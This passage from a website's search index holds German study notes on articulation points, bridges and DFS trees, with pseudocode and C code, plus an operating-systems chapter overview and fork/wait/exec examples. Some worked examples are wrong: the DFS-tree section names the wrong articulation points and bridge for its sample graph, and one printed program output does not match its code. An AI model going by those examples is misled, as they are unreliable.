Teilgraphen zerlegt.</p> </li> <li>Bedeutung: Wenn eine Br\u00fccke ausf\u00e4llt, rei\u00dft das Netzwerk an dieser Stelle ab.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#3-algorithmus-zur-erkennung-von-artikulationspunkten","title":"\ud83d\ude80 3\ufe0f\u20e3 Algorithmus zur Erkennung von Artikulationspunkten","text":"<p>Wir verwenden eine modifizierte Tiefensuche (DFS) mit zwei wichtigen Konzepten:</p> <ol> <li> <p>Entdeckungszeit (Discovery Time, <code>disc[]</code>):     Zeitpunkt, an dem ein Knoten w\u00e4hrend der DFS erstmals besucht wird.</p> </li> <li> <p>Low-Wert (<code>low[]</code>):     Der niedrigste Discovery-Wert, den ein Knoten erreichen kann, indem er R\u00fcckkanten (Back Edges) verwendet.</p> </li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#kriterien-fur-artikulationspunkte","title":"\u2705 Kriterien f\u00fcr Artikulationspunkte:","text":"<ol> <li>F\u00fcr die Wurzel des DFS-Baumes:<ul> <li>Artikulationspunkt, wenn sie mehr als ein Kind hat.</li> </ul> </li> <li>F\u00fcr alle anderen Knoten <code>v</code>:<ul> <li><code>v</code> ist ein Artikulationspunkt, wenn es ein Kind <code>u</code> gibt, sodass: </li> <li> \\[low[u]\u2265disc[v]\\] </li> <li>Das bedeutet: Es gibt keinen anderen Weg zur\u00fcck nach oben, au\u00dfer durch <code>v</code>.</li> </ul> </li> </ol> \ud83d\udd0d Pseudo-Code Artikulationspunkte <pre><code>FUNKTION findArticulationPoints(G):\n    INITIALISIERE:\n        disc[] = -1   // Discovery-Zeit f\u00fcr jeden Knoten\n        low[] = -1    // Low-Wert f\u00fcr jeden Knoten\n        parent[] = -1\n        ap[] = false  // Artikulationspunkte markieren\n        time = 0\n\n    F\u00dcR jeden Knoten v in G:\n        WENN v nicht besucht:\n            DFS(v)\n\nFUNKTION DFS(v):\n    disc[v] = low[v] = time\n    time += 1\n    kind = 0  // Anzahl der Kinder im DFS-Baum\n\n    F\u00dcR jeden Nachbarn u von v:\n        WENN u nicht besucht:\n            parent[u] = v\n            kind += 1\n            DFS(u)\n\n            low[v] = min(low[v], low[u])\n\n            // Artikulationspunkt-Bedingung (Nicht-Wurzel)\n            WENN parent[v] \u2260 -1 UND low[u] \u2265 disc[v]:\n                ap[v] = true\n\n        ANDERNFALLS WENN u \u2260 parent[v]:\n            low[v] = min(low[v], disc[u])\n\n    // Wurzel-Bedingung\n    WENN parent[v] == -1 UND kind &gt; 1:\n        ap[v] = true\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#7-brucken-bridges-erkennung","title":"\ud83d\ude80 7\ufe0f\u20e3 Br\u00fccken (Bridges) - Erkennung","text":"<p>Der Algorithmus ist fast identisch zu Artikulationspunkten, aber mit einer anderen Bedingung:</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#bedingung-fur-brucken","title":"\u2705 Bedingung f\u00fcr Br\u00fccken:","text":"<ul> <li>Eine Kante <code>(u, v)</code> ist eine Br\u00fccke, wenn: </li> <li> \\[low[v]&gt;disc[u]\\] </li> <li>Das bedeutet, dass <code>v</code> keine R\u00fcckkante zu einem fr\u00fcher besuchten Knoten au\u00dfer \u00fcber <code>u</code> hat.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#8-komplexitat","title":"\u23f1\ufe0f 8\ufe0f\u20e3 Komplexit\u00e4t","text":"<ul> <li>Laufzeit: \\(O(V+E)\\)</li> <li>Platzbedarf: \\(O(V)\\)</li> </ul> <p>Effizient f\u00fcr gro\u00dfe, zusammenh\u00e4ngende Netzwerke.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/6.%20Graphentheorie/#9-fazit","title":"\ud83c\udfaf 9\ufe0f\u20e3 Fazit","text":"<ul> <li>\u2705 Artikulationspunkte: Knoten, deren Entfernung den Graphen in Teile zerlegt.</li> <li>\u2705 Br\u00fccken: Kanten, deren Entfernung den Graphen trennt.</li> <li>\u2705 DFS-basiert: Effizient und weit verbreitet in Netzwerkanalysen.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/","title":"Tiefensuchb\u00e4ume (DFS-Trees) und ihre Anwendung","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#tiefensuchbaume-dfs-trees-und-ihre-anwendung","title":"Tiefensuchb\u00e4ume (DFS-Trees) und ihre Anwendung","text":"<p>Da wir gerade \u00fcber Artikulationspunkte und Br\u00fccken gesprochen haben, ist der n\u00e4chste logische Schritt, den Tiefensuchbaum (DFS-Tree) zu behandeln. Der DFS-Tree ist die Grundlage f\u00fcr viele Graph-Algorithmen, einschlie\u00dflich der Erkennung von Artikulationspunkten und Br\u00fccken.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#1-was-ist-ein-tiefensuchbaum-dfs-tree","title":"\ud83d\udcda 1\ufe0f\u20e3 Was ist ein Tiefensuchbaum (DFS-Tree)?","text":"<ul> <li>Ein Tiefensuchbaum ist ein Spanning Tree, der entsteht, wenn man einen Graphen mit der Depth-First Search (DFS) durchl\u00e4uft.</li> <li>Jeder Knoten wird genau einmal besucht, und die Kanten, die benutzt werden, um den Graphen zu erkunden, bilden den DFS-Tree.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#wichtige-begriffe","title":"\u2705 Wichtige Begriffe:","text":"<ol> <li> <p>Tree Edge (Baumkante):</p> <ul> <li>Kanten, die im DFS verwendet werden, um einen neuen Knoten zu erreichen.</li> <li>Teil des DFS-Trees.</li> <li> <p>Back Edge (R\u00fcckkante):</p> </li> <li> <p>Kanten, die einen Knoten mit einem bereits besuchten Vorfahren verbinden.</p> </li> <li>Sie zeigen, dass ein Zyklus im Graphen existiert.</li> <li> <p>Forward Edge (Vorw\u00e4rtskante):</p> </li> <li> <p>Kanten, die von einem Knoten zu einem bereits besuchten Nachkommen f\u00fchren (nur in gerichteten Graphen relevant).</p> </li> <li> <p>Cross Edge (Quer-Kante):</p> </li> <li> <p>Verbindet zwei nicht direkt verwandte Knoten im DFS-Tree (z.B. zwei Knoten aus verschiedenen Teilb\u00e4umen).</p> </li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#2-beispiel-dfs-tree-mit-einem-ungerichteten-graphen","title":"\ud83c\udf0d 2\ufe0f\u20e3 Beispiel: DFS-Tree mit einem ungerichteten Graphen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#graph","title":"Graph:","text":"<pre><code>    A\n   / \\\n  B   C\n   \\ / \\\n    D   E\n</code></pre> Start bei A.","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#dfs-traversierung-a-b-d-c-e","title":"\u2705 DFS-Traversierung (A \u2192 B \u2192 D \u2192 C \u2192 E):","text":"<ol> <li> <p>Baumkanten (Tree Edges):</p> <ul> <li>A \u2192 B</li> <li>B \u2192 D</li> <li>D \u2192 C</li> <li>C \u2192 E</li> <li> <p>R\u00fcckkante (Back Edge):</p> </li> <li> <p>C \u2192 A (zur\u00fcck zu einem Vorfahren)</p> </li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#dfs-tree-spanning-tree","title":"\ud83c\udf33 DFS-Tree (Spanning Tree):","text":"<pre><code>    A\n   /\n  B\n   \\\n    D\n     \\\n      C\n       \\\n        E\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#3-anwendung-des-dfs-trees-artikulationspunkte-brucken","title":"\ud83d\udea9 3\ufe0f\u20e3 Anwendung des DFS-Trees: Artikulationspunkte &amp; Br\u00fccken","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#artikulationspunkte-cut-vertices","title":"\u2705 Artikulationspunkte (Cut Vertices):","text":"<ul> <li> <p>Regel: Ein Knoten ist ein Artikulationspunkt, wenn das Entfernen des Knotens den Graphen in getrennte Komponenten zerlegt.</p> </li> <li> <p>In unserem Beispiel:</p> <ul> <li>B und D sind Artikulationspunkte.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#brucken-cut-edges","title":"\u2705 Br\u00fccken (Cut Edges):","text":"<ul> <li> <p>Regel: Eine Kante ist eine Br\u00fccke, wenn sie keinen Zyklus bildet.</p> </li> <li> <p>In unserem Beispiel:</p> <ul> <li>B-D ist eine Br\u00fccke.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#4-low-und-discovery-times-fur-dfs-algorithmen","title":"4\ufe0f\u20e3 Low- und Discovery-Times (f\u00fcr DFS-Algorithmen)","text":"<ul> <li>Discovery Time (<code>disc[]</code>): Der Zeitpunkt, an dem ein Knoten zum ersten Mal besucht wird.</li> <li>Low-Value (<code>low[]</code>): Der kleinste Discovery-Wert, der von diesem Knoten oder \u00fcber R\u00fcckkanten erreicht werden kann.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#formeln","title":"\u2705 Formeln:","text":"<ul> <li>F\u00fcr jeden Knoten <code>u</code>: (\\(low[u]=min\u2061(disc[u],disc[v],low[w])\\)\\)<ul> <li><code>v</code> = Nachbar von <code>u</code> (falls R\u00fcckkante)</li> <li><code>w</code> = Kind von <code>u</code> im DFS-Tree</li> </ul> </li> </ul> \ud83d\udd0d C-Code erzeugung DFS-Tree <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\n#define MAX 100\n\nint time = 0;\n\nvoid DFS(int u, int graph[MAX][MAX], int n, bool visited[], int parent[]) {\n    visited[u] = true;\n    printf(\"Besucht: %d\\n\", u);\n\n    for (int v = 0; v &lt; n; v++) {\n        if (graph[u][v]) {\n            if (!visited[v]) {\n                parent[v] = u;  // Baumkante\n                DFS(v, graph, n, visited, parent);\n            } else if (v != parent[u]) {\n                // R\u00fcckkante gefunden\n                printf(\"R\u00fcckkante: %d \u2194 %d\\n\", u, v);\n            }\n        }\n    }\n}\n\nvoid createDFSTree(int graph[MAX][MAX], int n, int start) {\n    bool visited[MAX] = {false};\n    int parent[MAX];\n\n    for (int i = 0; i &lt; n; i++) {\n        parent[i] = -1;\n    }\n\n    printf(\"DFS-Tree:\\n\");\n    DFS(start, graph, n, visited, parent);\n\n    printf(\"\\nBaumkanten:\\n\");\n    for (int i = 0; i &lt; n; i++) {\n        if (parent[i] != -1) {\n            printf(\"%d - %d\\n\", parent[i], i);\n        }\n    }\n}\n\nint main() {\n    int n = 5;\n    int graph[MAX][MAX] = {\n        {0, 1, 1, 0, 0},\n        {1, 0, 1, 1, 0},\n        {1, 1, 0, 1, 1},\n        {0, 1, 1, 0, 1},\n        {0, 0, 1, 1, 0}\n    };\n\n    createDFSTree(graph, n, 0);  // Startknoten: 0\n\n    return 0;\n}\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#beispiel-graph","title":"\u2705 Beispiel-Graph:","text":"<pre><code>    0\n   / \\\n  1   2\n   \\ / \\\n    3   4\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#ausgabe","title":"Ausgabe:","text":"<pre><code>DFS-Tree:\nBesucht: 0\nBesucht: 1\nBesucht: 3\nBesucht: 2\nBesucht: 4\n\nBaumkanten:\n0 - 1\n1 - 3\n3 - 2\n2 - 4\n\nR\u00fcckkante: 2 \u2194 0\nR\u00fcckkante: 2 \u2194 1\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/7.%20DFS%20-%20Detailreich/#6-fazit","title":"\ud83d\ude80 6\ufe0f\u20e3 Fazit","text":"<ul> <li>\u2705 DFS-Trees sind die Basis f\u00fcr viele Algorithmen, z.B. zur Erkennung von Artikulationspunkten und Br\u00fccken.</li> <li>\u2705 Tree Edges und Back Edges sind entscheidend f\u00fcr die Struktur des DFS-Trees.</li> <li>\u2705 Low- und Discovery-Times helfen, kritische Knoten und Kanten zu identifizieren.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/Inhaltsverzeichnis/","title":"Inhaltsverzeichnis","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/Inhaltsverzeichnis/#einfuhrung-prozesse-und-scheduling","title":"**\ud83d\udccc Einf\u00fchrung: Prozesse und Scheduling","text":"<p>Im Rahmen dieser Lehrveranstaltung wurden wir w\u00f6chentlich zu dem Buch \ud83d\udd17 O-STEP Book einzeln abgefragt. Wir haben Kapitel 3-38 behandelt. In der Abfrage konnte alles m\u00f6gliche was in den jeweiligen Kapiteln zu finden ist, drankommen. W\u00f6chentlich wurden in etwa 2-3 Kapitel behandelt.  Diese Seite und die zugeh\u00f6rigen Zusammenfassungen wurden nachtr\u00e4glich erstellt - also erst im Anschluss an den jeweiligen Kurs. Die Inhalte dienen vor allem dazu, einen Einblick in die behandelten Themen zu geben. Es kann daher vorkommen, dass einzelne Aspekte verk\u00fcrzt, vereinfacht oder nicht vollst\u00e4ndig dokumentiert sind.</p> <p>\ud83d\udd39 Kapitel 4 - Prozesse</p> <ul> <li>Ein Prozess ist ein laufendes Programm mit einem eigenen Adressraum.</li> <li>Prozesse haben Zust\u00e4nde: running, ready, waiting.</li> </ul> <p>\ud83d\udd39 Kapitel 5 - Process API</p> <ul> <li>Prozesse werden mit <code>fork()</code> erstellt und mit <code>exec()</code> ersetzt.</li> <li><code>wait()</code> sorgt daf\u00fcr, dass ein Elternprozess auf sein Kind wartet.</li> </ul> <p>\ud83d\udd39 Kapitel 6 - Direct Execution</p> <ul> <li>Ein Programm l\u00e4uft direkt auf der CPU, aber das Betriebssystem verwaltet den Zugriff auf Ressourcen \u00fcber System Calls.</li> </ul> <p>\ud83d\udd39 Kapitel 7 - CPU Scheduling</p> <ul> <li>First-Come, First-Served (FCFS) \u2192 einfacher, aber unfair.</li> <li>Round Robin (RR) \u2192 jeder Prozess erh\u00e4lt eine feste Zeitscheibe.</li> <li>Shortest Job First (SJF) \u2192 optimale Wartezeiten, aber schwer vorherzusagen.</li> </ul> <p>\ud83d\udd39 Kapitel 8 - Multi-Level Feedback Queue (MLFQ)</p> <ul> <li>Dynamisches Scheduling, das Prozesse priorisiert, die schnell reagieren m\u00fcssen.</li> </ul> <p>\ud83d\udd39 Kapitel 9 - Lottery Scheduling</p> <ul> <li>Threads erhalten \"Lottoscheine\", und einer wird zuf\u00e4llig zur Ausf\u00fchrung ausgew\u00e4hlt.</li> </ul> <p>\ud83d\udd39 Kapitel 10 - Multi-CPU Scheduling</p> <ul> <li>Symmetrisches und asymmetrisches Multi-Prozessor-Scheduling.</li> </ul> <p>\ud83d\udd39 Kapitel 11 - Zusammenfassung der Scheduling-Strategien</p> <ul> <li>Vergleich aller Scheduling-Algorithmen und deren Effizienz.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/Inhaltsverzeichnis/#teil-2-speicherverwaltung-kapitel-12-24","title":"\ud83d\udccc Teil 2: Speicherverwaltung (Kapitel 12-24)","text":"<p>\ud83d\udd39 Kapitel 12 - Adressr\u00e4ume</p> <ul> <li>Jeder Prozess hat seinen eigenen virtuellen Adressraum (Heap, Stack, Code, Data).</li> </ul> <p>\ud83d\udd39 Kapitel 13 - Address Spaces &amp; Code</p> <ul> <li>Trennung von virtuellen und physischen Adressen.</li> <li>OS verwaltet den Speicher mit Paging oder Segmentierung.</li> </ul> <p>\ud83d\udd39 Kapitel 14 - Memory API</p> <ul> <li>Heap-Management: <code>malloc()</code>, <code>free()</code> und Speicherallokatoren.</li> </ul> <p>\ud83d\udd39 Kapitel 15 - Address Translation</p> <ul> <li>MMU (Memory Management Unit) \u00fcbersetzt virtuelle in physische Adressen.</li> </ul> <p>\ud83d\udd39 Kapitel 16 - Segmentation</p> <ul> <li>Speicher wird in logische Segmente unterteilt.</li> <li>Problem: Fragmentierung.</li> </ul> <p>\ud83d\udd39 Kapitel 17 - Free Space Management</p> <ul> <li>Buddy-System &amp; Bitmap-Allokatoren verwalten freien Speicherplatz.</li> </ul> <p>\ud83d\udd39 Kapitel 18 - Einf\u00fchrung in Paging</p> <ul> <li>Paging unterteilt den Speicher in gleich gro\u00dfe Seiten.</li> <li>Vorteile: Kein Fragmentierungsproblem wie bei Segmentierung.</li> </ul> <p>\ud83d\udd39 Kapitel 19 - Translation Lookaside Buffer (TLB)</p> <ul> <li>TLB (Translation Lookaside Buffer) speichert h\u00e4ufig verwendete Adress\u00fcbersetzungen.</li> </ul> <p>\ud83d\udd39 Kapitel 20 - Fortgeschrittene Page Tables</p> <ul> <li>Multi-Level Page Tables sparen Speicherplatz.</li> <li>Inverted Page Tables speichern nur verwendete Seiten.</li> </ul> <p>\ud83d\udd39 Kapitel 21 - Swapping: Mechanismen</p> <ul> <li>Swapping lagert inaktive Prozesse auf die Festplatte aus.</li> </ul> <p>\ud83d\udd39 Kapitel 22 - Swapping: Policies</p> <ul> <li>Wann und wie oft Prozesse geswappt werden, beeinflusst die Performance.</li> </ul> <p>\ud83d\udd39 Kapitel 23 - Vollst\u00e4ndige VM-Systeme</p> <ul> <li>Kombiniert Paging, TLBs und Swapping f\u00fcr ein effizientes Speichersystem.</li> </ul> <p>\ud83d\udd39 Kapitel 24 - Zusammenfassung der Speicherverwaltung</p> <ul> <li>Vergleich von Paging, Swapping und Segmentierung.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/Inhaltsverzeichnis/#teil-3-concurrency-synchronisation-kapitel-25-34","title":"\ud83d\udccc Teil 3: Concurrency &amp; Synchronisation (Kapitel 25-34)","text":"<p>\ud83d\udd39 Kapitel 25 - Einf\u00fchrung in Concurrency</p> <ul> <li>Mehrere Threads k\u00f6nnen parallel laufen, m\u00fcssen aber synchronisiert werden.</li> </ul> <p>\ud83d\udd39 Kapitel 26 - Thread API</p> <ul> <li>POSIX-Threads (<code>pthread</code>) \u2192 <code>pthread_create()</code>, <code>pthread_join()</code>.</li> </ul> <p>\ud83d\udd39 Kapitel 27 - Locks</p> <ul> <li>Mutexe (<code>pthread_mutex_lock</code>) verhindern Race Conditions.</li> </ul> <p>\ud83d\udd39 Kapitel 28 - Locks mit Spinlocks</p> <ul> <li>Spin Locks vermeiden teure Kontextwechsel, verbrauchen aber CPU-Zeit.</li> </ul> <p>\ud83d\udd39 Kapitel 29 - Gesperrte Datenstrukturen</p> <ul> <li>Fine-Grained Locking: Mehrere Locks f\u00fcr verschiedene Teile der Datenstruktur.</li> </ul> <p>\ud83d\udd39 Kapitel 30 - Bedingungsvariablen</p> <ul> <li><code>pthread_cond_wait()</code> blockiert Threads, bis eine Bedingung erf\u00fcllt ist.</li> </ul> <p>\ud83d\udd39 Kapitel 31 - Semaphoren</p> <ul> <li><code>sem_wait()</code>, <code>sem_post()</code> kontrollieren den Zugriff auf mehrere Ressourcen.</li> </ul> <p>\ud83d\udd39 Kapitel 32 - Race Conditions &amp; Bugs</p> <ul> <li>Typische Fehler: Deadlocks, Starvation, Lost Updates.</li> </ul> <p>\ud83d\udd39 Kapitel 33 - Event-basierte Concurrency</p> <ul> <li>Alternative zu Threads: asynchrone Ereignisbehandlung.</li> </ul> <p>\ud83d\udd39 Kapitel 34 - Zusammenfassung der Synchronisationstechniken</p> <ul> <li>Vergleich: Mutexe, Semaphoren, Bedingungsvariablen, Spinlocks.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/1.%20Ein%20Dialog%20%C3%BCber%20Virtualisierung/","title":"Ein Dialog \u00fcber Virtualisierung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/1.%20Ein%20Dialog%20%C3%BCber%20Virtualisierung/#ein-dialog-uber-virtualisierung","title":"Ein Dialog \u00fcber Virtualisierung","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/1.%20Ein%20Dialog%20%C3%BCber%20Virtualisierung/#1-einfuhrung","title":"\ud83d\udcda 1\ufe0f\u20e3 Einf\u00fchrung","text":"<p>In diesem Kapitel wird die Bedeutung der Virtualisierung in Betriebssystemen durch einen fiktiven Dialog zwischen einem Professor und einem Studenten erl\u00e4utert. Es dient als Einf\u00fchrung in die Konzepte der CPU-Virtualisierung.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/1.%20Ein%20Dialog%20%C3%BCber%20Virtualisierung/#2-wichtige-konzepte","title":"\ud83d\udd11 2\ufe0f\u20e3 Wichtige Konzepte","text":"<ul> <li>Virtualisierung: Die Technik, mit der Betriebssysteme mehrere Prozesse so ausf\u00fchren, als h\u00e4tten sie die gesamte CPU f\u00fcr sich allein.</li> <li>Paranoia des Betriebssystems: Das OS muss sicherstellen, dass es die Kontrolle \u00fcber alle Prozesse beh\u00e4lt, um Ressourcen effektiv zu verwalten und Sicherheit zu gew\u00e4hrleisten.</li> <li>Mechanismen der Virtualisierung: Verwendung von Traps, Trap-Handlern und Timer-Interrupts, um Prozesse zu steuern und Kontextwechsel durchzuf\u00fchren.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/1.%20Ein%20Dialog%20%C3%BCber%20Virtualisierung/#3-mechanismen-und-strategien","title":"\u2699\ufe0f 3\ufe0f\u20e3 Mechanismen und Strategien","text":"<ul> <li>Begrenzte Direktausf\u00fchrung: Prozesse laufen direkt auf der Hardware, aber das OS beh\u00e4lt die Kontrolle durch spezielle Mechanismen.</li> <li>Traps und Trap-Handler: Erm\u00f6glichen es dem OS, auf spezielle Ereignisse oder Ausnahmen zu reagieren.</li> <li>Timer-Interrupts: Helfen dem OS, die Ausf\u00fchrungszeit von Prozessen zu steuern und fair zu verteilen.</li> </ul>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/1.%20Ein%20Dialog%20%C3%BCber%20Virtualisierung/#4-beispiele-und-analysen","title":"\ud83d\udcc8 4\ufe0f\u20e3 Beispiele und Analysen","text":"<p>Der Dialog illustriert, wie das OS durch den Einsatz von Traps und Interrupts die Kontrolle beh\u00e4lt, selbst wenn Prozesse direkt auf der Hardware ausgef\u00fchrt werden. Dies gew\u00e4hrleistet sowohl Effizienz als auch Sicherheit.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/1.%20Ein%20Dialog%20%C3%BCber%20Virtualisierung/#5-fazit","title":"\ud83c\udfaf 5\ufe0f\u20e3 Fazit","text":"<p>Die CPU-Virtualisierung ist ein zentrales Konzept in Betriebssystemen, das es erm\u00f6glicht, mehrere Prozesse effizient und sicher auszuf\u00fchren. Durch Mechanismen wie begrenzte Direktausf\u00fchrung, Traps und Timer-Interrupts beh\u00e4lt das OS stets die Kontrolle \u00fcber die Systemressourcen.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/","title":"Process API - Erstellen und Verwalten von Prozessen","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/#process-api-erstellen-und-verwalten-von-prozessen","title":"Process API - Erstellen und Verwalten von Prozessen","text":"","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/#1-was-ist-ein-prozess","title":"\ud83d\udcda 1\ufe0f\u20e3 Was ist ein Prozess?","text":"<p>Ein Prozess ist eine laufende Instanz eines Programms mit eigenem Speicherbereich und Registerzustand.</p> <p>\ud83d\udca1 Zwei M\u00f6glichkeiten zur Prozesserstellung:</p> <ol> <li> <p>Neuen Prozess von Grund auf erstellen</p> <ul> <li>Lade Code &amp; Daten in den Speicher</li> <li>Erstelle einen leeren Call Stack</li> <li>Initialisiere den Prozesskontrollblock (PCB)</li> <li>Setze den Prozess auf die Ready-Queue     \u2705 Vorteil: Keine unn\u00f6tigen Kopien     \u274c Nachteil: Komplizierter einzurichten</li> <li> <p>Vorhandenen Prozess klonen &amp; anpassen</p> </li> <li> <p>Unix fork(): Erstellt eine exakte Kopie des Elternprozesses</p> </li> <li>exec(): Ersetzt den aktuellen Code durch ein anderes Programm     \u2705 Vorteil: Schnell durch Copy-on-Write (CoW)     \u274c Nachteil: Erst Kopieren, dann \u00dcberschreiben ist ineffizient</li> </ul> </li> </ol>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/#2-der-fork-system-call-prozesse-duplizieren","title":"\ud83d\udd04 2\ufe0f\u20e3 Der <code>fork()</code> System Call - Prozesse duplizieren","text":"<p><code>fork()</code> erstellt eine exakte Kopie des laufenden Prozesses.</p> <p>\ud83d\udccc Wichtig:</p> <ul> <li>Das Kind erh\u00e4lt seine eigene Speicherzuweisung.</li> <li>Elternprozess bekommt die PID des Kindes, Kind bekommt <code>0</code>.</li> </ul> <p>\ud83d\udccc Syntax in C:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    printf(\"Hallo Welt (pid:%d)\\n\", getpid());\n    int rc = fork();\n    if (rc &lt; 0) {\n        fprintf(stderr, \"Fehler: fork() fehlgeschlagen\\n\");\n        exit(1);\n    } else if (rc == 0) {\n        printf(\"Ich bin das Kind (pid:%d)\\n\", getpid());\n    } else {\n        printf(\"Ich bin der Elternprozess von %d (pid:%d)\\n\", rc, getpid());\n    }\n    return 0;\n}\n</code></pre> <p>\ud83d\udca1 Ergebnis (nicht-deterministisch!):</p> <pre><code>Hallo Welt (pid:29146)  \nIch bin der Elternprozess von 29147 (pid:29146)  \nIch bin das Kind (pid:29147)  \n</code></pre>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/#3-der-wait-system-call-warten-auf-kindprozesse","title":"\u23f3 3\ufe0f\u20e3 Der <code>wait()</code> System Call - Warten auf Kindprozesse","text":"<p><code>wait()</code> sorgt daf\u00fcr, dass ein Elternprozess auf das Ende eines Kindprozesses wartet.</p> <p>\ud83d\udccc Beispiel:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    int rc = fork();\n    if (rc &lt; 0) {\n        fprintf(stderr, \"fork fehlgeschlagen\\n\");\n        exit(1);\n    } else if (rc == 0) {\n        printf(\"Ich bin das Kind (pid:%d)\\n\", getpid());\n        sleep(1);\n    } else {\n        int wc = wait(NULL);\n        printf(\"Elternprozess von %d (wc:%d) (pid:%d)\\n\", rc, wc, getpid());\n    }\n    return 0;\n}\n</code></pre> <p>\u2705 Ergebnis (deterministisch!):</p> <pre><code>Ich bin das Kind (pid:29267)  \nElternprozess von 29267 (wc:29267) (pid:29266)\n</code></pre> <p>\ud83d\udd39 Der Elternprozess wartet, bis das Kind beendet wurde.</p>","tags":["Course/"]},{"location":"studium/Betriebssysteme%28unvollst%C3%A4ndig%29/0.%20Einf%C3%BChrung/2.%20Einf%C3%BChrung%20in%20Prozesse/#4-der-exec-system-call-ein-anderes-programm-starten","title":"\ud83c\udfc3\u200d\u2642\ufe0f 4\ufe0f\u20e3 Der <code>exec()</code> System Call - Ein anderes Programm starten","text":"<p>Mit <code>exec()</code> kann ein Prozess ein anderes Programm ausf\u00fchren, indem er sein eigenes ersetzt.</p> <p>\ud83d\udccc Beispiel:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    int rc = fork();\n    if (rc &lt; 0) {\n        fprintf(stderr, \"fork fehlgeschlagen\\n\");\n        exit(1);\n    } else if (rc == 0) {\n        char *args[] = {\"ls\", \"-l\", NULL};  // \"ls -l\" ausf\u00fchren\n        execvp(args[0], args);\n        printf(\"Dies wird nicht mehr ausgef\u00fchrt\\n\");\n    } else {\n        wait(NULL);\n        printf(\"Elternprozess beendet\\n\");\n    }\n    return 0;\n}\n</code></pre> <p>\u2705 Erkl\u00e4rung:</p> <ul> <li>Elternprozess bleibt gleich.</li> <li>Kindprozess 